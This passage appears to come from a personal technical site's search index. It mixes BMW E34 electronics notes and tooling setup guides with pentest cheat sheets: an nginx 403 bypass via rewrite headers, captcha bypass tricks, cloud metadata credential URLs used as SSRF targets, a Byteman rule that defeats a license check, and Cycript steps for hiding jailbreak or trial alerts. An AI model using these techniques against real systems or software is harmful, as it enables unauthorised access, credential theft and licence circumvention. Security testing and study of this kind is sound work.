‚ÄúON‚Äù Signal KOMBI Instrument Cluster KOREL Compressor Relay Signal KW Crankshaft PDC Park Distance Control LCM Lamp Check Module EML Electronic Engine Power Control LDP Leak Diagnosis Pump LEV Low Emission Vehicle LKM Lamp Control Module LL Closed Throttle LSZ Lamp Switching Center LWS 5 Steering Angle Sensor MBC Maximum Brake Control MDK Motorized Throttle Valve MF Timer with switching function for heating/ventilation MFC Multi-Function Controller MFW Multifunction Clock MID Multi-Information Display MoDiC Mobile Diagnostic Computer MRS Multiple Restraint System OBC On-Board Computer OBD On-Board Diagnosis (SAE) PB Pin Assignments PBUS Periphery Bus PWG Pedal Position Sensor RDC Tire Pressure Control RDW Tire Pressure Warning RM Relay Module RXD Wake-up Diagnosis Line RZV Direct Stationary Ignition SA Special Equipment SB Fuse Assignments SG Control Unit SGS Seat Integrated Belt System SII Service Interval Indicator SM Seat Module SP Schematic ST Connector Views SZM Central Switch Center Module TD Engine Speed TI Injector on time TL Part Throttle TRS Battery Isolation Switch TSH Door Lock Heating TU Technical Update TXD Transmitting Diagnosis Line VANOS Variable Camshaft Timing YOURF3 Integrated Heading Control w/ filter 3 VL Full load - wide open throttle WK Converter Lock-up Clutch ZAE Central Airbag Electronics ZGM Central Gateway Module ZKE Central Body Electronics ZV Central Locking System ZVM Central Locking Module ZWD Idle Control Valve ", 
        "url": "\/bmw-acronyms\/"
    },
    
    
    
    "\/bmw-ag-e34-learning-materials\/": {
        
        "title": "BMW AG (E34) Learning Materials",
        "tags": [],
        "content": "This is Bavarian (E34 5-series focused) learning materials and resources, mostly related to ECUs, DMEs, Tuning, EE, Wirings et al. I currently daily-drive BMW E34, therefore I collect my own repair\u0026amp;restoration techniques. The documentation is written and compiled with different models and versions in mind, but keeping the methodologies of the BMW Technical Documentation collected and researched through the years. Nevertheless, a lot of topics and information presented here are #ReverseEngineered from the very low or no available resources, for years in the past. Thank me later ‚Üí.\nTable of Content Electronic Signals AC \u0026amp; DC Signals AC Voltage Signals DC Voltage Signals Analog NTC Sensors PTC Sensors Potentiometers Digital B+ Signal B- Signal Square Wave Signals DC Digital Sensors Hall Effect Sensors Magnetoresistive Sensors Designated Value Signals Coded Ground Signals DC Digital Input/Output Stages Signals Table E34: Speed Signal Test your knowledge See Also BMW Acronyms DIN 72552 Wiring Circuit Basics Circuit Debugging E34 Low Cluster - EURO - MY. 88-90 Test Bench E34 Low Cluster - EURO - MY. 88-90 Pinout E34 Misc. Wiring Electronic Signals Objectives of the Electronic Signals is to explain inductive sensors, and type of signals one may stumble upon during the reversing and hacking of BMW E34s and possibly other series as well. Upon completion, you should understand the difference between analog and digital signals, know the difference between NTC and PTC sensors, recognizing different signals on the oscilloscope etc. Besides, many EE stuff can be learn from reading the resources published. Reference Bus Networks BMW utiliese Bus Networks on their vehicle. Starting from E38, BMW marked the first large scale usage of bus network on BMW vehicles. For the first time, bus networks are used to reduce overall wiring requirements. More about Bus Systems can be found in the Power Supply and Bus Systems (pdf) (ext). Automotive Electronics Basics Relays / Starter Interrupts, SPDT and SPST Automotive Relays, Resistors, Blocking Diodes, Isolating Door Triggers and Sensors, Diodes Across the Coil of Relays, Car Audio, Mobile Video, Navigation References Introduction to Bus Systems, Breakout Boxes and Connectors, Engine Electronics Overview, Air Management, Ignition Management, Coding and Programming, Wiring Diagram Symbols, Electronic Signals, Coding, Individualization \u0026amp; Programming (CIP), BMW Technical Training Documents ", 
        "url": "\/bmw-ag-e34-learning-materials\/"
    },
    
    
    
    "\/bmw-qa\/": {
        
        "title": "BMW Q\u0026A",
        "tags": [],
        "content": " What are the two main groups of signals? The two parts of an inductive sensor are? The frequency of the signal indicates? In an NTC sensor, as Temperature increases, what does Resistance do? High resistance in a PTC sensor indicates warm or cold? A 5V measurement in a NTC sensor means? Describe the purpose of the three wires used on a potentiometar? How many voltage level possibilities does a Modulated Square Wave contain? The Duty Cycle of a Square Wave is the ratio of X to X time. Duty Cycle is expressed in which signs? A 50 milliseconds is equal to how much seconds? When is the signal on a Hall Effect Sensor high? ", 
        "url": "\/bmw-qa\/"
    },
    
    
    
    "\/building-kali-linux-for-banana-pro\/": {
        
        "title": "Building Kali Linux for Banana Pro",
        "tags": [],
        "content": "Equipment MacOS with GNU/Linux Virtual Machine or GNU/Linux equivalent LeMaker Banana Pro arm_pc SDCard with at least 16GB capacity (preferably \u0026ldquo;Class 10\u0026rdquo; or higher) Build Instructions The Banana Pro has a dual core 1GHz Cortex‚Ñ¢-A7 processor with a Mali400MP2 GPU and 1GB DDR3 RAM. Kali Linux can run from an external microSD card.\nKali Linux is supporting Banana Pro but it must be built from source. You will obviously need a GNU/Linux based OS (preferably Kali Linux) \u0026ndash; although I personally use VMWare Workstation with Ubuntu 20.04. I\u0026rsquo;d advice you to mkswap of at least 8GB space, and extend your drive to min. 120GB. The build instructions are summarised below, with Banana Pro build script described here:\n$ cd ~/ $ git clone https://gitlab.com/kalilinux/build-scripts/kali-arm $ cd ~/kali-arm/ $ sudo ./common.d/build_deps.sh # will take some time # =\u0026gt; i\u0026#39;m a fan of Mate DE $ sudo ./banana-pro.sh --desktop mate Compilation info Hardware model: Banana Pro (32-bit) Architecture: armhf OS build: kali-rolling 2022.2 Desktop manager: mate ... The generated image will be deployed in the ./images directory with the *.img.xz.\nPost-Build Instructions After successfully building a Kali Linux image for Banana Pro, via the process explained above, you can now proceed to deploy the final arm image by any route of your interest.\nTherefore, if you want to use dd \u0026ndash; via GNU/Linux or MacOS:\nxzcat images/kali-linux-2022.2-banana-pro-xfce-armhf.img.xz | sudo dd of=/dev/sdb bs=4M status=progres\nOr, if you are like me \u0026ndash; favoring BalenaEtcher which automatically fixes BOOT disk partitions:\nPick an Image -\u0026gt; Select SD Card -\u0026gt; Etch!\nRunning Your Banana Pro might need a first-setup hardware equipment (display, mouse \u0026amp; kb).\nPreflight Configuration:\nI usually deploy the following config once I\u0026rsquo;m logged in Kali:\n# =\u0026gt; ssh kali@x.x.x.x $ touch .hushlogin # =\u0026gt; remove welcome message $ echo $PS1 # =\u0026gt; (in .bashrc): PS1=\u0026#34;@\\h [\\s] \\w \u0026#34; \u0026#34;@\\h [\\s] \\w \u0026#34; @ kali [-bash] ~ # =\u0026gt; clean term prompt Enabling root¬†account:\nkali@kali:~$ sudo passwd [sudo] password for kali: Enabling root for SSH:\nkali@kali:~$ grep PermitRootLogin /etc/ssh/sshd_config #PermitRootLogin prohibit-password # the setting of \u0026#34;PermitRootLogin without-password\u0026#34;. kali@kali:~$ kali@kali:~$ man sshd_config | grep -C 1 prohibit-password PermitRootLogin Specifies whether root can log in using ssh(1). The argument must be yes, prohibit-password, forced-commands-only, or no. The default is prohibit-password. If this option is set to prohibit-password (or its deprecated alias, without-password), password and keyboard-interactive authentication are disabled for root. kali@kali:~$ kali@kali:~$ sudo systemctl restart ssh Upgrading \u0026amp; Updating the box\nkali@kali:~$ sudo apt update kali@kali:~$ sudo apt full-upgrade -y kali@kali:~$ sudo apt install -y kali-linux-default Other metapacakages: System Packages, DE\u0026rsquo;s, Tools Package, Menu Package\nAdditional info is available on Kali.org website, which includes Kali In The Browser (noVNC), Kali In The Browser (Guacamole).\n", 
        "url": "\/building-kali-linux-for-banana-pro\/"
    },
    
    
    
    "\/bypass-403-on-nginx\/": {
        
        "title": "Bypass 403 on nginx",
        "tags": [],
        "content": "Normally a client can\u0026rsquo;t access /admin directory because of front nginx server which returns 403 Forbidden. We can:\n* use `X-Rewrite-Url` or `X-original-url` * back server processes these headers and front server doesn't. Steps to reproduce:\nnormally\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: login.example.com\u0026#39; $\u0026#39;https://login.example.com/admin/login\u0026#39; 403 Forbidden ... bypass (1)\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: login.example.com\u0026#39; -H $\u0026#39;X-rewrite-url: admin/login\u0026#39; $\u0026#39;https://login.example.com/\u0026#39; 200 OK bypass (2)\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: example.ba\u0026#39; -H $\u0026#39;X-rewrite-url: admin\u0026#39; $\u0026#39;https://example.ba/\u0026#39; 200 OK ", 
        "url": "\/bypass-403-on-nginx\/"
    },
    
    
    
    "\/byteman\/": {
        
        "title": "Byteman",
        "tags": [],
        "content": "Introduction Byteman is a bytecode manipulation tool for tweaking and changing Java application at load time and runtime. It work without the needs for recompilation. The modification is purely in memory, via Event Condition Action rule language - based on Java.\nRules Write ECA based rules which you can inject using Byteman directives and command line application.\n# =\u0026gt; trace.btm RULE trace main entry CLASS ^CognitiveApp METHOD main AT ENTRY IF TRUE DO traceln(\u0026#34;Byteman: Application loaded successfully. java.application.main() called.\u0026#34;) ENDRULE Replace the CognitiveApp with any class handling the Main application login. Use JD-GUI to find for main() functions. It\u0026rsquo;s important to leave ^ char because it indicates the regex pattern.\nRegisters The following registers exists:\nRULE, CLASS, METHOD (Description, Classname, Method Name) AT ENTRY, AT EXIT AT EXCEPTION EXIT AT EXCEPTION ENTRY IF TRUE (Run always) IF counter / 5 == 10 DO (Execute command) DO incrementCounter(\u0026ldquo;cnt\u0026rdquo;) DO trace(\u0026ldquo;Trace string line\u0026rdquo;) DO traceStack(\u0026ldquo;Trace stack line\u0026rdquo;) BIND (Read variable) BIND counter = readCounter(\u0026ldquo;cnt\u0026rdquo;) ENDRULE (Script end) Running Run the Java application either via Command Line or from the *.shortcut Add %JAVABYTE_HOME% environment in Windows/Linux (ie. setx on Windows, or export on Linux) Create a RULE Use bminstall.bat $PID to inject Byteman in the JVM runtime Use bmsubmit.bat ..\\scripts\\trace.btm to register Byteman script Watch application stdout log output and search for traceln tagged calls # =\u0026gt; WinNT injection example \u0026gt; cd byteman/bin \u0026gt; bminstall.bat $PID \u0026gt; bmsubmit.bat ..\\scripts\\trace.btm Cannot locate byteman JBoss modules plugin jar redefine rule trace main entry Scripts List of scripts and usage on Byteman Scripts. Just for reference.\nReferences Official JBoss Byteman Programmers Guide Official Script Samples A Byteman Tutorial JUDCon Flavia Race Condition Bytemon Slides Blog - How to use JBoss and Bytemon Hooking into vulnerabilities in Java applications ", 
        "url": "\/byteman\/"
    },
    
    
    
    "\/byteman-scripts\/": {
        
        "title": "Byteman Scripts",
        "tags": [],
        "content": "Simple trace skeleton\nRULE trace CLASS ^App METHOD login AT ENTRY IF true DO System.out.println(\u0026#34; Tracing login stdout\u0026#34;) DO traceln(\u0026#34;Tracing login ended\u0026#34;) ENDRULE Trace application entry\nRULE trace application entry CLASS ^App METHOD main AT ENTRY IF TRUE DO traceln(\u0026#34;BMB java.application.main() called!\u0026#34;) ENDRULE Trace application exit\nRULE trace application exit CLASS ^App METHOD main AT EXIT IF TRUE DO traceln(\u0026#34;BMB java.application exited\u0026#34;) ENDRULE Thread start\nRULE trace thread start CLASS java.lang.Thread METHOD start() IF true DO traceln(\u0026#34;*** BMB start for thread: \u0026#34; + $0.getName()) ENDRULE Trace application login\nRULE trace application login CLASS ^LoginApi METHOD login AT ENTRY IF TRUE DO traceln(\u0026#34;BMB java.application.login() called!\u0026#34;) ENDRULE Trace class create entry\nRULE ClassLoadMonitor trace create CLASS java.lang.ClassLoader METHOD defineClass(String, byte[], int, int, ProtectionDomain) AT EXIT IF TRUE DO traceStack(\u0026#34;*** BMB Called defineClass(\u0026#34; + $1 + \u0026#34;) in thread \u0026#34; + Thread.currentThread().getName() + \u0026#34;\\n\u0026#34;, 10) ENDRULE Early return\nRULE bypass license expiration CLASS ^App METHOD checkForSecurity AT ENTRY DO debug(\u0026#34;returning earlz with bool\u0026#34;); return true ENDRULE Set default TimeZone\nRULE check setDefault CLASS java.util.TimeZone METHOD setDefault(TimeZone) AT ENTRY IF TRUE DO traceStack(\u0026#34;XXX attempting to get change the default timezone \u0026#34;+ \u0026#34;: parameter : \u0026#34; +$1 + \u0026#34; : detail : \u0026#34; + $1.getDisplayName()) ENDRULE ", 
        "url": "\/byteman-scripts\/"
    },
    
    
    
    "\/c-plus-plus-demangler\/": {
        
        "title": "C Plus Plus Demangler",
        "tags": [],
        "content": "Install C++ demangler globally via npm using the following command:\n$ npm i frida-compile demangler-js -g Now in Frida Script you can use something like this snippet to demangle obfuscated C++ module or library:\nconst demangle = require(\u0026#39;demangler-js\u0026#39;).demangle; ... Module.enumerateExportsSync(\u0026#39;library.so\u0026#39;) .filter(x =\u0026gt; x.name.startsWith(\u0026#39;_Z\u0026#39;)) .forEach(x =\u0026gt; { Interceptor.attach(x.address, { onEnter: function (args) { console.log(\u0026#39;[-] \u0026#39; + demangle(x.name)); } }); }); Compile via frida-compile:\n$ frida-compile script.js -o out.js Run the demangler with Frida as usual, but make sure to include newly compiled script:\n$ frida -Uf com.app -l out.js ```¬†", 
        "url": "\/c-plus-plus-demangler\/"
    },
    
    
    
    "\/canfd-specifications\/": {
        
        "title": "CANFD Specifications",
        "tags": [],
        "content": " Extended CAN frame. Can send larger payloads. A bit different structure. Using CANEdge2 for testing the CANFD frames. ", 
        "url": "\/canfd-specifications\/"
    },
    
    
    
    "\/captcha-bypass-tricks\/": {
        
        "title": "Captcha Bypass Tricks",
        "tags": [],
        "content": "Header Injection to bypoass Captcha\n1. Response manipulation. 2. Use previously used token. 3. Use any token with same length(+1/-1). 4. Remove the param value or remove the entire parameter. 5. Change method from POST to GET(or PUT) and remove the captcha. 6. Change body to JSON or vice-versa. 7. OCR. 8. Check whether the captcha is in the source code. (Ex: 2+2) 9. Check whether the value of the captcha is in the source code. 10. Use the same captcha value with the different sessionIDs. 11. JSON Body? Combine 6 and 5. 12. Add headers: X-Forwarded-Host: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Client-IP: 127.0.0.1 X-Host: 127.0.0.1 ", 
        "url": "\/captcha-bypass-tricks\/"
    },
    
    
    
    "\/categories\/": {
        
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "\/categories\/"
    },
    
    
    
    "\/circuit-basics\/": {
        
        "title": "Circuit Basics",
        "tags": [],
        "content": "Types of measurements There are basically two types of measurements; the voltage measurement and the current measurement. In addition, there is also the resistance measurement or continuity measurement.\nVoltage measurement With a voltage measurement you can track whether and how far the voltage from the voltage source (usually the battery) is carried to the consumer via the switch and fuse. This is always done parallel to the consumer, unless the circuit diagram gives other options because the lamp z. B. is one-sided to ground (body). Then you can also measure against the body. Also, the consumer does not necessarily have to be connected to ground.\na) Consumer is connected to Ground b) Consumer is connected to Plus (Positive), and is switched to Ground If you measure as presented in example (b) above; a diode against the body, you will always measure 12 volts, but diode will not burn.\nCurrent measurement If it is determined during a voltage measurement that the load is \u0026ldquo;live\u0026rdquo;, this still does not mean that it is functional. However, we can check this by measuring the current, by setting the multimeter to measure current and looping the DMM into a live line with both test probes. Again, pay attention to the measuring range and set the DMM to the expected current. If the DMM now shows a current value, we can assume that the load is ok.\nCircuit Diagram Symbols In order to be able to understand a circuit diagram, you have to know a few basic rules and symbols.\nTwo lines cross here, but there is no electrical connection Only through this point (node) is a connection made between the red and the blue line in the circuit diagram Two lines cross here, but there is no electrical connection Battery Resistance (Resistor) Lamp Connector Earth Point (Ground) Fuse Pointer Instrument Switch Light-emitting diode (LED) Relay Circuit Component Descriptions Relay A relay is an electromechanical component consisting of a coil (wire wound around a metal core) and a contact spring. If a current (excitation circuit) is sent through the coil, a magnetic force is created which attracts the contact spring. This closes the working circuit. The excitation current is very small, a few milliamps. A significantly higher current and voltage can now be switched via the working contact. You could use it e.g. B. switch a 220 volt lamp with a 4.5 volt battery. Since both circuits (4.5 volts and 220 volts) are galvanically isolated, there is no risk of shock. The second application is that you can switch huge consumer currents with relatively weak switches (miniature button in the control panel controls the air conditioning compressor).\nLight-emitting diode or LED An LED is a colored display. When connecting, you have to pay attention to the polarity, it doesn\u0026rsquo;t light up the wrong way around. The short leg is always connected in the direction of ground. Most of the time, the LED on the side is also somewhat flattened. It may only be operated with a series resistor. If it is operated without a series resistor, it will burn out.\nTroubleshooting Calculation of the series of resistor:\nLED forward voltage:\t3 volts (depending on color and manufacturer) LED working current:\t20 mA = 0.02 amps (depending on color and manufacturer) Operating voltage:\t12 volts 12 - 3 ------- = 450 ohms 0.02 To make sure resistor doesn\u0026rsquo;t burn, we still have to calculate its power:\n(12 - 3) x 0.02 amperes = 0.18 watts Conclusion: A resistor (450 ohms) and 0.25 watts (standard) is completely sufficient.\nHow to: Tracing the Electrical Issues Simple debugging w/ Multimeter:\nLets make an example. Our first attempt consists of a 12V battery, a Fuse F1, a Switch S1, two connectors, and a lamp. The issue we are experiencing is that the lamp does not light up, although the switch is pressed. The circuit we are testing will look something like this:\nCircuit we are testing, alongside the toolset used We take our multimeter and use the input for voltage measurement. Measuring range 15 volts. We hold the black test tip to ground. With the red test tip we measure both sides of the lamp. The display shows 0V for both measurements.\nThis is logical on the right side of the lamp, since this is where we measure mass. However, 12.5 volts should be present on the left side. We think of the switch S1 as actuated, ie. closed, and current can flow. The cause could be a defective switch, a blown fuse F1 or a dead battery. We measure again with the red test probe directly on the positive pole of the battery and lo and behold, the multimeter shows 12.5 volts.\nNow let\u0026rsquo;s assume that we can\u0026rsquo;t do any more voltage measurements on the fuse. What now? How can we check the fuse? Very simple, we do a resistance measurement of the fuse. To do this, we remove them from the \u0026ldquo;bracket\u0026rdquo; (ie. where fuses sits at).\nWe now switch our multimeter to resistance measurement and hold both test probes together. The meter now reads 0 ohms, which is OK. With this, we have tested the cables and possibly adjusted the multimeter to 0. Now we hold both test probes to the fuse. Here, too, we get almost 0 ohms as a measured value. Hooray, the fuse is ok too. If it were defective, the measuring device would display a value approaching infinity.\nAfter we have reinstalled the fuse, we set the measuring device back to voltage measurement. With the probe we now measure both connections of the switch (input and output). Here, too, we get 12.5 volts as a measured value in both cases. Everything is fine it seems, and yet there is no voltage on the lamp?\nOnly the two connectors and the cable between them remain. Could this be where the error is? So we disconnect both connectors and again make a resistance measurement at the two ends of the cable. The resistance measurement gives a value towards infinity.\nAha! So there is a broken cable and we have found the fault.\nTo be on the safe side, we can still replace the defective cable with our measuring device. We switch the meter to current measurement, measuring range 1 Amp. We hold the black test tip to the one connector that comes from the switch and the red test tip to the other connector that goes to the lamp. The multimeter shows 0.5 amperes and the lamp burns. The cable is thus clearly localized as the source of the error.\n", 
        "url": "\/circuit-basics\/"
    },
    
    
    
    "\/classical-api-abuse\/": {
        
        "title": "Classical API Abuse",
        "tags": [],
        "content": "API Keys Reuse Use Keyhacks to scan for key leaks.\nAPI Calling Convention Try to hook() on a call or initiate new calls from the handler.\n", 
        "url": "\/classical-api-abuse\/"
    },
    
    
    
    "\/cloud-metadata\/": {
        
        "title": "Cloud Metadata",
        "tags": [],
        "content": "AWS # from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories http://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key AWS (dirs ) http://169.254.169.254/ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/public-keys/ Google Cloud # https://cloud.google.com/compute/docs/metadata # - Requires the header \u0026#34;Metadata-Flavor: Google\u0026#34; or \u0026#34;X-Google-Metadata-Request: True\u0026#34; http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id # Google allows recursive pulls http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true Google # Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn) http://metadata.google.internal/computeMetadata/v1beta1/ Digital Ocean # https://developers.digitalocean.com/documentation/metadata/ http://169.254.169.254/metadata/v1.json http://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1/user-data http://169.254.169.254/metadata/v1/hostname http://169.254.169.254/metadata/v1/region http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address Packetcloud https://metadata.packet.net/userdata Azure # Limited, maybe more exist? # https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/ http://169.254.169.254/metadata/v1/maintenance ## Update Apr 2017, Azure has more support; requires the header \u0026#34;Metadata: true\u0026#34; # https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service http://169.254.169.254/metadata/instance?api-version=2017-04-02 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02\u0026amp;format=text OpenStack/RackSpace # (header required? unknown) http://169.254.169.254/openstack HP Helion # (header required? unknown) http://169.254.169.254/2009-04-04/meta-data/ Oracle Cloud http://192.0.0.192/latest/ http://192.0.0.192/latest/user-data/ http://192.0.0.192/latest/meta-data/ http://192.0.0.192/latest/attributes/ Alibaba http://100.100.100.200/latest/meta-data/ http://100.100.100.200/latest/meta-data/instance-id http://100.100.100.200/latest/meta-data/image-id ", 
        "url": "\/cloud-metadata\/"
    },
    
    
    
    "\/coded-ground-signals\/": {
        
        "title": "Coded Ground Signals",
        "tags": [],
        "content": "Coded Ground Signals produce a set of High/Low requests, the combination (pattern) which is interpreted by the Control Module, to perform a specific function. Coded Ground Signals are generated through a switch, or a series of switches, signaling the control module requests for operation.\nBelow is an example of Wiper Switch Schematic, presenting a switch-based logic, depending on the pattern (Pin Status), executing different function depending on the Pin values.\nWiper Switch Schematics, Using a Switch combination (pattern) to execute Wiper functions Typical Application of Coded Ground Signals Wiper Switch Windows Switch ", 
        "url": "\/coded-ground-signals\/"
    },
    
    
    
    "\/configure-lldb-on-m1\/m2\/": {
        
        "title": "Configure LLDB on M1\/M2",
        "tags": [],
        "content": "Table of Contents:\nPrepare MacOS to use Python 3 Setup LLDB to use Python 3 by default Setup LLDB to use snare\u0026rsquo;s voltron UI Prepare MacOS to prefer Python 3\n$ brew unlink python $ brew install python@3.11 # or any other version $ brew link --force python@3.11 Use this time to prepare and confirm everything is working correctly; ie. pip, \u0026amp; python. Using brew again, we can gather some information:\n$ brew info python # ... Python has been installed as /opt/homebrew/bin/python3 You can install Python packages with pip3 install \u0026lt;package\u0026gt; # packages will be installed in: # /opt/homebrew/lib/python3.11/site-packages # @see: https://docs.brew.sh/Homebrew-and-Python Add the Python\u0026rsquo;s binary toolsets in environment PATH, like so:\n$ vim ~/.zshrc ## add: # export PATH=\u0026#34;$(brew --prefix)/opt/python@3.11/libexec/bin:$PATH\u0026#34; The above output path can be found via brew info command. The symlinking will NOT be automatically handled;\n$ ls -l /usr/bin/python* -rwxr-xr-x 76 root wheel 167136 Feb 9 10:39 /usr/bin/python3 Lets symlink our new Python 3.11 to system\u0026rsquo;s path. This will force system to use python3.11 when passing python3 or python in Terminal CLI.\n$ ln -s -f /usr/bin/python3 /opt/homebrew/bin/python3.11 $ ln -s -f /usr/bin/python /opt/homebrew/bin/python3.11 Important, also sync the Python to the MacOS framework\u0026rsquo;s and XCode:\n$ sudo mkdir /usr/local/Frameworks $ sudo chown $USER /usr/local/Frameworks $ xcode-select -p ## /Applications/Xcode.app/Contents/Developer $ sudo ln -s /opt/homebrew/opt/python@3.11/bin/python3.11 /Applications/Xcode.app/Contents/Developer/usr/bin/python3 $ sudo ln -s /opt/homebrew/opt/python@3.11/bin/python3.11 /Applications/Xcode.app/Contents/Developer/usr/bin/python # finally, relink everything $ brew unlink python@3.11 \u0026amp;\u0026amp; brew link python@3.11 This will solve typical XCode\u0026rsquo;s pop-up where it asks you to install Developers Command Line Tools.\n$ python Python 3.11.2 (main, Feb 16 2023, 02:55:59) [Clang 14.0.0 (clang-1400.0.29.202)] on darwin \u0026gt;\u0026gt;\u0026gt; Prepare LLDB Python Version\nOn macOS, LLDB (and GDB) are linked against MacOS default Python version, so Voltron must be installed using this version of Python. A possible workaround is to force default\u0026rsquo;s com.apple.dt.lldb Python key, to correspond to version 3.\nThis will obligate LLDB to use Python 3 by default; meaning all Python scripts, plugins and other providers during lldb usage will be powered by Python 3.\n# replace \u0026#34;write\u0026#34; w/ \u0026#34;read\u0026#34; to get the DefaultPythonVersion # $ defaults write com.apple.dt.lldb DefaultPythonVersion 3 Setup LLDB to use Voltron\nAfter completing above steps; install Voltron UI as a Python3 module, via pip. Make sure to install voltron to user-centric environment.\n# where pip3 == /opt/homebrew/lib/python3.11/site-packages/pip $ pip3 install voltron # Successfully installed ... or via Git repository;\n$ cd ~/.config \u0026amp;\u0026amp; git clone https://github.com/snare/voltron $ ./install.sh -s # using -s installs voltron in system-wide dir. The output is:\nInstalled for LLDB (/opt/homebrew/opt/llvm/bin/lldb): Python: /opt/homebrew/opt/python@3.11/Frameworks/Python.framework/Versions/3.11/bin/python3.11 Packages directory: /opt/homebrew/opt/python@3.11/Frameworks/Python.framework/Versions/3.11/lib/python3.11/site-packages Added voltron to: /Users/$USER/.lldbinit Entry point: /opt/homebrew/opt/python@3.11/Frameworks/Python.framework/Versions/3.11/lib/python3.11/site-packages/voltron/entry.py But, wait! There seems to be two multiple versions of lldb, one from the OS and the other from Homebrew; although they both are version 15.0.7, there seems to be a hash missmatch.\n$ shasum /opt/homebrew/opt/llvm/bin/lldb /usr/bin/lldb c45c4e6098ab0d648d5f43a4e58b837f30fc80dc /opt/homebrew/opt/llvm/bin/lldb a96c93b07b616a03bf1dfef57b81a19b603f921e /usr/bin/lldb The main difference is that the lldb provided by the MacOS is already signed and usable on most targets, without needing to disable SIP or append special entitlements. On other hand, the brew\u0026rsquo;s lldb might be signed by those whom published the formulae on the homebrews repository, therefore, not being notarized for all targets.\nOpen up your ~/.lldbinit and import newely installed Voltron module, like so:\n$ vim ~/.lldbinit ## add: script import voltron command script import /opt/homebrew/Cellar/python@3.11/3.11.2_1/Frameworks/Python.framework/Versions/3.11/lib/python3.11/site-packages/voltron/entry.py After completing all steps, try launching lldb. The REPL output should look like this:\n$ lldb /tmp/ls # Voltron loaded. # ... Refer to Voltron official documentation for more details about usage and customisation. Below is author\u0026rsquo;s debug environment for showoff.\nAuthor\u0026#39;s LLDB Configuration - Using Tmux, iTerm and lldb ", 
        "url": "\/configure-lldb-on-m1\/m2\/"
    },
    
    
    
    "\/cycript\/": {
        
        "title": "Cycript",
        "tags": [],
        "content": "Tips and Tricks for Cycript\nRemote connection to Cycript\nhcy = dlopen(\u0026#34;libcycript.dylib\u0026#34;, 1) CYListenServer=(typedef void(short)) (dlysym(hcy, \u0026#34;CYListenServer\u0026#34;)) CYListenServer(55000) tcprelay -t 55000:55000 cycript -r 127.0.0.1:55000 Get loaded dyld modules\ncy# utils.get_dyld_info() cy# ObjectiveC.images Inject LOAD_DYLIB from Cycript\ncy# dlopen(\u0026#34;/usr/lib/test.dylib\u0026#34;, 1) Tap an UIButton programatically\n[#0x000000000 sendActionsForControlEvents:UIControlEventTouchUpInside] Get pasteboard/clipboard items\n[UIPasteboard generalPasteboard].items Get UI elements dump\n[[UIApp keyWindow] recursiveDescription] Remove a SubView of a SuperView\n[0x000000000 removeFromSuperview] Bypass undismissable UIAlertController, (ie. Jailbreak Detected, Trial Ended, etc.)\n# Dump iOS UI, via Objection com.xxxxxxxxxxx.app on (iPhone: xx.x.x) [usb] # ios ui dump # Dump iOS UI, via Cycript [[UIApp keyWindow] recursiveDescription] # Note down memory pointer addresses, referencing to UIAlert[View|Controller], and/or # any bottom-up threads on Stack indicating SuperView(s), containing the undissmisable # UIAlert*, such is \u0026#39;UITransitionView\u0026#39;. @see below: # # example ui: # \u0026lt;UIWindow: 0x143dxxxxx; ...\u0026gt; # app. main thread # \u0026lt;UILayoutContainerView: 0x143exxxxx; ...\u0026gt; # the \u0026#39;view\u0026#39; that is unreachable # ... [redacted] ... # \u0026lt;UITransitionView: 0x143exxxxx; ...\u0026gt; # the \u0026#39;view\u0026#39; containing UIAlert* subview # \u0026lt;_UIAlertControllerView: 0x1440xxxxx; ..-\u0026gt; # the \u0026#39;view\u0026#39; of UIAlert* controller # # therefore, you\u0026#39;d either patch ptr(0x143exxxxx:UITransitionView) and ptr(0x1440xxxxx:UIAlertController) # or only patching ptr(0x1440xxxxx:UIAlertController) if no super-view is present. # Use Cycript to hide UIAlert[View|Controller], and/or any other top-level view(s) # containing this UIAlert; as explained in above snippet. [#0x1440xxxxx setHidden:YES] [#0x143exxxxx setHidden:YES] Syslog Macros\n# =\u0026gt; common.cy @import com.saurik.substrate.MS NSLog_ = dlsym(RTLD_DEFAULT, \u0026#34;NSLog\u0026#34;) NSLog = function() { var types = \u0026#39;v\u0026#39;, args = [], count = arguments.length; for (var i = 0; i != count; ++i) { types += \u0026#39;@\u0026#39;; args.push(arguments[i]); } new Functor(NSLog_, types).apply(null, args); } Load the macro into Cycript:\n$ cycript -p App common.cy $ cycript -p App Read syslog for log lines:\nsocat - UNIX-CONNECT:/var/run/lockdown/syslog.sock watch ", 
        "url": "\/cycript\/"
    },
    
    
    
    "\/dc-digital-io-stages\/": {
        
        "title": "DC Digital IO Stages",
        "tags": [],
